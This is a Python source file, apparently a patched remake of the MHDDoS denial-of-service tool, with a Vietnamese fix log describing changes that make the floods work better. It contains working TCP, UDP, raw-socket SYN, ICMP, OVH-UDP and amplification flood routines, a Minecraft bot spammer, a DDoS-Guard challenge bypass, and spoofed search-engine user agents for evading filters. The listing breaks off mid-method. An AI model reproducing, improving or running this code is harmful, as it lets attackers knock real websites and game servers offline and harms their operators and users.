#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MHDDoS - DDoS Attack Script (remake + đã vá lỗi)

================= FIX LOG =================
[B1] Layer4.TCP / Layer4.UDP: thêm `global REQUESTS_SENT, BYTES_SEND`.
     Trước đây UnboundLocalError ở mỗi lần flush 4096 gói, bị
     suppress(Exception) nuốt im -> PPS/BPS = 0 và socket bị đóng/mở lại liên tục.
[B2] bombardier_path: khai báo ở cấp module -> BOMB không còn NameError.
[B3] Menu tự tạo files/useragent.txt + files/referers.txt.
[B4] Layer4._ovh_pool và _icmp_pkt: cache theo target.
[B5] `STOP` / `TOOLS` thoát hẳn, không rơi xuống nhánh "Method Not Found".
[B6] Thêm OVH-UDP vào danh sách method bắt buộc raw socket.
[B7] ToolsConsole: implement CFIP và DNS.
[B8] ToolsConsole.info(): đọc đúng key lồng nhau + nhiều endpoint.
[B9] Layer4: reflector sai/thiếu -> báo lỗi rõ ràng.
[B10] sys.setswitchinterval hạ thật xuống 0.001.
[B11] Counter: cộng có lock -> không mất số khi nhiều thread.
[B12] Ép kiểu argv có kiểm tra.
[B13] threads và rpc bắt buộc >= 1.
[B14] BOMB kiểm tra proxy trước khi spawn thread.
[B15] Dọn code chết: _generate_ovhudp(), tor2webs trùng, class-attr cycle thừa.
[B16] Tích hợp AIOHTTPFlood thành method L7 `AIOHTTP` (asyncio, keep-alive).
[B17] FIX bug trong AsyncHttpFlood: `_open()` không nhận tham số `proxy`
      nhưng `_flooder()` gọi `self._open(proxy)` -> TypeError bị
      `except Exception` nuốt -> AIOHTTP không gửi được request nào.
[B18] Tích hợp đoạn script asyncio rời thành method L7 `ASYNCIO`:
      mỗi vòng lặp mở KẾT NỐI MỚI (tối đa hoá CPS), `threads` = số worker
      coroutine, `rpc` = request mỗi kết nối. Thêm counter CONNECTIONS_SENT
      và in PPS | CPS | BPS mỗi giây (info, không cần bật debug).
      Logic flooder() giữ nguyên như script gốc, chỉ thêm close() để
      không rò rỉ file descriptor và hỗ trợ proxy HTTP.
[B19] AsyncHttpFlood._flooder / AsyncCpsFlood.flooder: thiếu
      `global REQUESTS_SENT, BYTES_SEND, CONNECTIONS_SENT` ->
      UnboundLocalError bị `except Exception` nuốt. ASYNCIO không gửi
      được request nào; AIOHTTP chỉ gửi 1 request/kết nối và PPS/BPS = 0.
==========================================
"""

import asyncio
import sys
from socket import SOL_SOCKET, SO_SNDBUF
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import suppress
from itertools import cycle
from json import load
from logging import basicConfig, getLogger, shutdown
from math import log2, trunc
from multiprocessing import Value
from os import urandom as randbytes, getpid
from pathlib import Path
from re import compile
from random import choice as randchoice, randint
from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP,
                    SOCK_DGRAM, IPPROTO_ICMP, SOCK_RAW, SOCK_STREAM, TCP_NODELAY,
                    gethostbyname, gethostname, socket)
from ssl import CERT_NONE, SSLContext, create_default_context
import ssl
from struct import pack as data_pack
from subprocess import run, PIPE
from sys import argv
from sys import exit as _exit
from threading import Event, Thread, active_count
from time import sleep, time
from typing import Any, List, Set, Tuple
from urllib import parse
from uuid import UUID, uuid4
from base64 import b64encode

from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
from PyRoxy import Tools as ProxyTools
from certifi import where
from cloudscraper import create_scraper
from dns import resolver
from icmplib import ping
from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
from requests import Response, Session, exceptions, get, cookies
from yarl import URL

sys.setswitchinterval(0.001)          # [B10]
basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
            datefmt="%H:%M:%S")
logger = getLogger("MHDDoS")
logger.setLevel("INFO")

if sys.platform == "win32":
    with suppress(Exception):
        from ctypes import windll
        windll.kernel32.SetConsoleMode(windll.kernel32.GetStdHandle(-11), 7)
    with suppress(Exception):
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")

ctx: SSLContext = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE
if hasattr(ctx, "minimum_version") and hasattr(ssl, "TLSVersion"):
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
if hasattr(ssl, "OP_NO_TLSv1"):
    ctx.options |= ssl.OP_NO_TLSv1
if hasattr(ssl, "OP_NO_TLSv1_1"):
    ctx.options |= ssl.OP_NO_TLSv1_1

__version__: str = "2.4 SNAPSHOT"
__dir__: Path = Path(__file__).parent
__ip__: Any = None

bombardier_path: Path = Path.home() / "go" / "bin" / "bombardier"

tor2webs = [
    'onion.city', 'onion.cab', 'onion.direct', 'onion.sh', 'onion.link',
    'onion.ws', 'onion.pet', 'onion.rip', 'onion.plus', 'onion.top',
    'onion.si', 'onion.ly', 'onion.my', 'onion.lu', 'onion.casa',
    'onion.com.de', 'onion.foundation', 'onion.rodeo', 'onion.lat',
    'tor2web.org', 'tor2web.fi', 'tor2web.blutmagie.de', 'tor2web.to',
    'tor2web.io', 'tor2web.in', 'tor2web.it', 'tor2web.xyz', 'tor2web.su',
    'darknet.to', 's1.tor-gateways.de', 's2.tor-gateways.de',
    's3.tor-gateways.de', 's4.tor-gateways.de', 's5.tor-gateways.de'
]

_cfg_path = __dir__ / "config.json"
if not _cfg_path.exists():
    raise SystemExit(
        f"[MHDDoS] Không tìm thấy file cấu hình: {_cfg_path}\n"
        f"          Hãy tải kèm config.json từ "
        f"https://github.com/MatrixTM/MHDDoS"
    )
with open(_cfg_path, encoding="utf-8") as f:
    con = load(f)

with socket(AF_INET, SOCK_DGRAM) as s:
    s.connect(("8.8.8.8", 80))
    __ip__ = s.getsockname()[0]


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def exit(*message):
    """Thoát chương trình. Có message -> exit code 1 (lỗi), không -> 0 (bình thường)."""
    if message:
        logger.error(bcolors.FAIL + " ".join(map(str, message)) + bcolors.RESET)
    shutdown()
    _exit(1 if message else 0)


class Methods:
    LAYER7_METHODS: Set[str] = {
        "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
        "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR",
        "RHEX", "STOMP", "AIOHTTP", "ASYNCIO"      # [B18]
    }

    LAYER4_AMP: Set[str] = {
        "MEM", "NTP", "DNS", "ARD",
        "CLDAP", "CHAR", "RDP"
    }

    LAYER4_METHODS: Set[str] = {*LAYER4_AMP,
                                "TCP", "UDP", "SYN", "VSE", "MINECRAFT",
                                "MCBOT", "CONNECTION", "CPS", "FIVEM",
                                "FIVEM-TOKEN", "TS3", "MCPE", "ICMP", "OVH-UDP",
                                }

    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}

    # [B18] method L7 chạy bằng asyncio (1 thread chứa event loop)
    ASYNC_METHODS: Set[str] = {"AIOHTTP", "ASYNCIO"}


search_engine_agents = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; "
    "+http://www.google.com/bot.html) Chrome/103.0.5060.134 Safari/537.36",
    "Googlebot-Image/1.0",
    "Googlebot-Video/1.0",
    "Googlebot-News",
    "AdsBot-Google (+http://www.google.com/adsbot.html)",
    "AdsBot-Google-Mobile-Apps",
    "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html)",
    "Mediapartners-Google",
    "FeedFetcher-Google; (+http://www.google.com/feedfetcher.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "BingPreview/1.0b",
    "AdIdxBot/2.0 (+http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Yahoo! Slurp China",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "YandexMobileBot/3.0 (+http://yandex.com/bots)",
    "YandexImages/3.0 (+http://yandex.com/bots)",
    "YandexVideo/3.0 (+http://yandex.com/bots)",
    "YandexNews/3.0 (+http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Baiduspider-image (+http://www.baidu.com/search/spider.html)",
    "Baiduspider-video (+http://www.baidu.com/search/spider.html)",
    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
    "DuckDuckBot/2.0; (+http://duckduckgo.com/duckduckbot.html)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/14.0 Safari/605.1.15 (Applebot/0.1; "
    "+http://www.apple.com/go/applebot)",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Facebot/1.0",
    "Twitterbot/1.0",
    "LinkedInBot/1.0 (+https://www.linkedin.com/)",
    "Pinterest/0.2 (+http://www.pinterest.com/bot.html)",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "SemrushBot/7~bl (+http://www.semrush.com/bot.html)",
    "MJ12bot/v1.4.8 (http://mj12bot.com/)",
    "Sogou web spider/4.0 (+http://www.sogou.com/docs/help/webmasters.htm#07)",
    "Exabot/3.0 (+http://www.exabot.com/go/robot)",
    "SeznamBot/3.2 (http://napoveda.seznam.cz/seznambot-intro/)",
    "CCBot/2.0 (+http://commoncrawl.org/faq/)",
    "DotBot/1.1 (+http://www.opensiteexplorer.org/dotbot, help@moz.com)"
]

DEFAULT_REFERERS: List[str] = [
    "https://www.facebook.com/l.php?u=",
    "https://www.facebook.com/sharer/sharer.php?u=",
    "https://drive.google.com/viewerng/viewer?url=",
    "https://www.google.com/translate?u="
]

DEFAULT_USERAGENTS: List[str] = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577',
    'Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931',
    'Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
    'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',
    'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
    'Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
    'Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9',
    'Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
]


class Counter:
    """[B11] Bộ đếm dùng chung giữa các thread, có lock -> không mất số."""
    __slots__ = ("_value",)

    def __init__(self, value: int = 0):
        self._value = Value('q', value)

    def __iadd__(self, value: int):
        with self._value.get_lock():
            self._value.value += value
        return self

    def __int__(self) -> int:
        return self._value.value

    def set(self, value: int):
        with self._value.get_lock():
            self._value.value = value
        return self


REQUESTS_SENT = Counter()
BYTES_SEND = Counter()
CONNECTIONS_SENT = Counter()      # [B18] CPS


class Tools:
    IP = compile("(?:\\d{1,3}\\.){3}\\d{1,3}")
    protocolRex = compile('"protocol":(\\d+)')

    @staticmethod
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        MULTIPLES = [
            "B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"
        ]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        else:
            return "-- B"

    @staticmethod
    def humanformat(num: int, precision: int = 2):
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 999:
            obje = sum(
                [abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
        return str(num)

    @staticmethod
    def sizeOfRequest(res: Response) -> int:
        size: int = len(res.request.method)
        size += len(res.request.url)
        size += len('\r\n'.join(f'{key}: {value}'
                                for key, value in res.request.headers.items()))
        return size

    @staticmethod
    def send(sock: socket, packet: bytes):
        global BYTES_SEND, REQUESTS_SENT
        try:
            sent = sock.send(packet)
        except (BlockingIOError, InterruptedError):
            return True
        if sent <= 0:
            return False
        while sent < len(packet):
            n = sock.send(memoryview(packet)[sent:])
            if n <= 0:
                return False
            sent += n
        BYTES_SEND += sent
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def sendto(sock, packet, target):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.sendto(packet, target):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def dgb_solver(url, ua, pro=None):
        s = Session()
        if pro:
            s.proxies = pro

        hdrs = {
            "User-Agent": ua, "Accept": "text/html", "Accept-Language": "en-US",
            "Connection": "keep-alive", "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1", "TE": "trailers", "DNT": "1",
        }
        with s.get(url, headers=hdrs) as ss:
            for key, value in ss.cookies.items():
                s.cookies.set_cookie(cookies.create_cookie(key, value))

        hdrs = {
            "User-Agent": ua, "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate", "Referer": url,
            "Sec-Fetch-Dest": "script", "Sec-Fetch-Mode": "no-cors",
            "Sec-Fetch-Site": "cross-site",
        }
        idss = None
        with s.post("https://check.ddos-guard.net/check.js", headers=hdrs) as ss:
            for key, value in ss.cookies.items():
                if key == "__ddg2":
                    idss = value
                s.cookies.set_cookie(cookies.create_cookie(key, value))

        if idss:
            hdrs = {
                "User-Agent": ua, "Accept": "image/webp,*/*",
                "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "no-cache", "Referer": url,
                "Sec-Fetch-Dest": "script", "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site",
            }
            with s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
        return s

    @staticmethod
    def safe_close(sock=None):
        if sock:
            with suppress(Exception):
                sock.close()


class Minecraft:
    @staticmethod
    def varint(d: int) -> bytes:
        o = b''
        while True:
            b = d & 0x7F
            d >>= 7
            o += data_pack("B", b | (0x80 if d > 0 else 0))
            if d == 0:
                break
        return o

    @staticmethod
    def data(*payload: bytes) -> bytes:
        payload = b''.join(payload)
        return Minecraft.varint(len(payload)) + payload

    @staticmethod
    def short(integer: int) -> bytes:
        return data_pack('>H', integer)

    @staticmethod
    def long(integer: int) -> bytes:
        return data_pack('>q', integer)

    @staticmethod
    def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(version),
                              Minecraft.data(target[0].encode()),
                              Minecraft.short(target[1]),
                              Minecraft.varint(state))

    @staticmethod
    def handshake_forwarded(target: Tuple[str, int], version: int, state: int, ip: str, uuid: UUID) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(version),
                              Minecraft.data(target[0].encode(), b"\x00", ip.encode(),
                                             b"\x00", uuid.hex.encode()),
                              Minecraft.short(target[1]),
                              Minecraft.varint(state))

    @staticmethod
    def login(protocol: int, username: str) -> bytes:
        if isinstance(username, str):
            username = username.encode()
        return Minecraft.data(Minecraft.varint(0x00 if protocol >= 391 else \
                                               0x01 if protocol >= 385 else \
                                               0x00),
                              Minecraft.data(username))

    @staticmethod
    def keepalive(protocol: int, num_id: int) -> bytes:
        return Minecraft.data(Minecraft.varint(0x0F if protocol >= 755 else \
                                               0x10 if protocol >= 712 else \
                                               0x0F if protocol >= 471 else \
                                               0x10 if protocol >= 464 else \
                                               0x0E if protocol >= 389 else \
                                               0x0C if protocol >= 386 else \
                                               0x0B if protocol >= 345 else \
                                               0x0A if protocol >= 343 else \
                                               0x0B if protocol >= 336 else \
                                               0x0C if protocol >= 318 else \
                                               0x0B if protocol >= 107 else \
                                               0x00),
                              Minecraft.long(num_id) if protocol >= 339 else \
                              Minecraft.varint(num_id))

    @staticmethod
    def chat(protocol: int, message: str) -> bytes:
        return Minecraft.data(Minecraft.varint(0x03 if protocol >= 755 else \
                                               0x03 if protocol >= 464 else \
                                               0x02 if protocol >= 389 else \
                                               0x01 if protocol >= 343 else \
                                               0x02 if protocol >= 336 else \
                                               0x03 if protocol >= 318 else \
                                               0x02 if protocol >= 107 else \
                                               0x01),
                              Minecraft.data(message.encode()))


# noinspection PyBroadException,PyUnusedLocal
class Layer4(Thread):
    _method: str
    _target: Tuple[str, int]
    _ref: Any
    SENT_FLOOD: Any
    _proxies: List[Proxy] = None

    BUF_SIZE = 512
    BUF_COUNT = 128
    _buf_pool: List[bytes] = None
    _syn_pool: List[bytes] = None
    _syn_target: Any = None
    _icmp_pkt: bytes = None
    _icmp_target: Any = None          # [B4]
    _ovh_pool: List[bytes] = None
    _ovh_target: Any = None           # [B4]

    def _bufs(self) -> List[bytes]:
        if Layer4._buf_pool is None:
            Layer4._buf_pool = [randbytes(self.BUF_SIZE) for _ in range(self.BUF_COUNT)]
        return Layer4._buf_pool

    def __init__(self,
                 target: Tuple[str, int],
                 ref: List[str] = None,
                 method: str = "TCP",
                 synevent: Event = None,
                 proxies: Set[Proxy] = None,
                 protocolid: int = 74):
        Thread.__init__(self, daemon=True)
        self._amp_payload = None
        self._amp_payloads = cycle([])
        self._ref = ref
        self.protocolid = protocolid
        self._method = method
        self._target = target
        self._synevent = synevent
        if proxies:
            self._proxies = list(proxies)

        self.methods = {
            "UDP": self.UDP,
            "SYN": self.SYN,
            "VSE": self.VSE,
            "TS3": self.TS3,
            "MCPE": self.MCPE,
            "FIVEM": self.FIVEM,
            "FIVEM-TOKEN": self.FIVEMTOKEN,
            "OVH-UDP": self.OVHUDP,
            "MINECRAFT": self.MINECRAFT,
            "CPS": self.CPS,
            "CONNECTION": self.CONNECTION,
            "MCBOT": self.MCBOT,
        }

    def _syns(self) -> List[bytes]:
        if Layer4._syn_pool is None or Layer4._syn_target != self._target:
            pkts = []
            for _ in range(512):
                ip = IP()
                ip.set_ip_src(__ip__)
                ip.set_ip_dst(self._target[0])
                tcp = TCP()
                tcp.set_SYN()
                tcp.set_th_flags(0x02)
                tcp.set_th_dport(self._target[1])
                tcp.set_th_sport(ProxyTools.Random.rand_int(32768, 65535))
                ip.contains(tcp)
                pkts.append(ip.get_packet())
            Layer4._syn_pool = pkts
            Layer4._syn_target = self._target
        return Layer4._syn_pool

    def run(self) -> None:
        if self._synevent is None:
            self._synevent = Event()
            self._synevent.set()
        self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD()

    def open_connection(self,
                        conn_type=AF_INET,
                        sock_type=SOCK_STREAM,
                        proto_type=IPPROTO_TCP):
        global CONNECTIONS_SENT           # [B18]
        if self._proxies:
            s = randchoice(self._proxies).open_socket(
                conn_type, sock_type, proto_type)
        else:
            s = socket(conn_type, sock_type, proto_type)
        s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        s.settimeout(.9)
        s.connect(self._target)
        CONNECTIONS_SENT += 1
        return s

    def TCP(self) -> None:
        global REQUESTS_SENT, BYTES_SEND        # [B1]
        bufs = self._bufs()
        nb = len(bufs)
        i = n = 0
        bs = self.BUF_SIZE
        ev = self._synevent
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            s.settimeout(None)
            send = s.send
            while ev.is_set():
                send(bufs[i])
                i += 1
                if i >= nb:
                    i = 0
                n += 1
                if n >= 4096:
                    REQUESTS_SENT += n
                    BYTES_SEND += n * bs
                    n = 0
            if n:
                REQUESTS_SENT += n
                BYTES_SEND += n * bs
        Tools.safe_close(s)

    def MINECRAFT(self) -> None:
        handshake = Minecraft.handshake(self._target, self.protocolid, 1)
        ping = Minecraft.data(b'\x00')

        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while self._synevent.is_set() and Tools.send(s, handshake):
                Tools.send(s, ping)
        Tools.safe_close(s)

    def CPS(self) -> None:
        global REQUESTS_SENT
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            REQUESTS_SENT += 1
        Tools.safe_close(s)

    def alive_connection(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while s.recv(1):
                continue
        Tools.safe_close(s)

    def CONNECTION(self) -> None:
        global REQUESTS_SENT
        if active_count() > 4096:
            sleep(.01)
            return
        with suppress(Exception):
            Thread(target=self.alive_connection, daemon=True).start()
            REQUESTS_SENT += 1

    def UDP(self) -> None:
        global REQUESTS_SENT, BYTES_SEND        # [B1]
        bufs = self._bufs()
        nb = len(bufs)
        i = 0
        n = 0
        bs = self.BUF_SIZE
        target = self._target
        ev = self._synevent
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            with suppress(OSError):
                s.setsockopt(SOL_SOCKET, SO_SNDBUF, 4 << 20)
            if sys.platform == "win32":
                with suppress(Exception):
                    s.ioctl(socket.SIO_UDP_CONNRESET, False)
            sendto = s.sendto
            while ev.is_set():
                sendto(bufs[i], target)
                i += 1
                if i >= nb:
                    i = 0
                n += 1
                if n >= 4096:
                    REQUESTS_SENT += n
                    BYTES_SEND += n * bs
                    n = 0
            if n:
                REQUESTS_SENT += n
                BYTES_SEND += n * bs
        Tools.safe_close(s)

    def _ovh_packets(self) -> List[bytes]:
        if Layer4._ovh_pool is None or Layer4._ovh_target != self._target:
            pool = []
            for _ in range(64):
                ip = IP()
                ip.set_ip_src(__ip__)
                ip.set_ip_dst(self._target[0])
                udp = UDP()
                udp.set_uh_sport(randint(1024, 65535))
                udp.set_uh_dport(self._target[1])
                method = randchoice(["PGET", "POST", "HEAD", "OPTIONS", "PURGE"])
                path = randchoice(['/0/0/0/0/0/0', '/', '/null', '/%00%00%00%00'])
                body = randbytes(randint(1024, 2048))
                udp.contains(Data(b"%s %s HTTP/1.1\r\nHost: x\r\n\r\n" % (
                    method.encode(), path.encode()) + body))
                ip.contains(udp)
                pool.append(ip.get_packet())
            Layer4._ovh_pool = pool
            Layer4._ovh_target = self._target
        return Layer4._ovh_pool

    def OVHUDP(self) -> None:
        pkts = self._ovh_packets()
        nb = len(pkts)
        i = 0
        ev = self._synevent
        target = self._target
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            with suppress(OSError):
                s.setsockopt(SOL_SOCKET, SO_SNDBUF, 4 << 20)
            sendto = s.sendto
            while ev.is_set():
                sendto(pkts[i], target)
                i += 1
                if i >= nb:
                    i = 0
        Tools.safe_close(s)

    def ICMP(self) -> None:
        if Layer4._icmp_pkt is None or Layer4._icmp_target != self._target:
            Layer4._icmp_pkt = self._genrate_icmp()
            Layer4._icmp_target = self._target
        payload = Layer4._icmp_pkt
        ev = self._synevent
        target = self._target
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            with suppress(OSError):
                s.setsockopt(SOL_SOCKET, SO_SNDBUF, 4 << 20)
            sendto = s.sendto
            while ev.is_set():
                sendto(payload, target)
        Tools.safe_close(s)

    def SYN(self) -> None:
        pkts = self._syns()
        nb = len(pkts)
        i = 0
        ev = self._synevent
        target = self._target
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            with suppress(OSError):
                s.setsockopt(SOL_SOCKET, SO_SNDBUF, 4 << 20)
            sendto = s.sendto
            while ev.is_set():
                sendto(pkts[i], target)
                i += 1
                if i >= nb:
                    i = 0
        Tools.safe_close(s)

    def AMP(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            with suppress(OSError):
                s.setsockopt(SOL_SOCKET, SO_SNDBUF, 4 << 20)
            while self._synevent.is_set():
                packet, target = next(self._amp_payloads)
                Tools.sendto(s, packet, target)
        Tools.safe_close(s)

    def MCBOT(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            Tools.send(s, Minecraft.handshake_forwarded(self._target,
                                                        self.protocolid,
                                                        2,
                                                        ProxyTools.Random.rand_ipv4(),
                                                        uuid4()))
            username = f"{con.get('MCBOT', 'MHDDoS')}{ProxyTools.Random.rand_str(5)}"
            password = b64encode(username.encode()).decode()[:8].title()
            Tools.send(s, Minecraft.login(self.protocolid, username))

            sleep(1.5)

            Tools.send(s, Minecraft.chat(self.protocolid, "/register %s %s" % (password, password)))
            Tools.send(s, Minecraft.chat(self.protocolid, "/login %s" % password))

            while self._synevent.is_set() and Tools.send(
                s, Minecraft.chat(self.protocolid, str(ProxyTools.Random.rand_str(256)))):
                sleep(1.1)

        Tools.safe_close(s)

    def VSE(self) -> None:
        payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                   b'\x20\x51\x75\x65\x72\x79\x00')
        s = None
